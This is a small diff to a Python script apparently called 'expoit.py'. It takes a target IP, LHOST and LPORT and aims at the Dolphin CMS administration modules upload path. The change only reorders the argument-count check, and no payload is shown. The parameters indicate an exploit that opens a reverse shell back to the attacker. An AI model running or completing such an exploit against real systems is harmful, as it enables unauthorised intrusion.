@@ -10,13 +10,14 @@ import binascii
 from urllib.parse import quote_plus
 import time
 
+
+if len(sys.argv) <= 1:
+    print("Usage: ./expoit.py targetIP LHOST LPORT")
+    exit()
+
 target = sys.argv[1]
 lhost = sys.argv[2]
 lport = sys.argv[3]
-
-if len(sys.argv) <= 3:
-    print("Usage: ./expoit.py targetIP LHOST LPORT")
-    exit()
 
 url = "http://" + target
 upload_path = '/dolphin2/administration/modules.php'
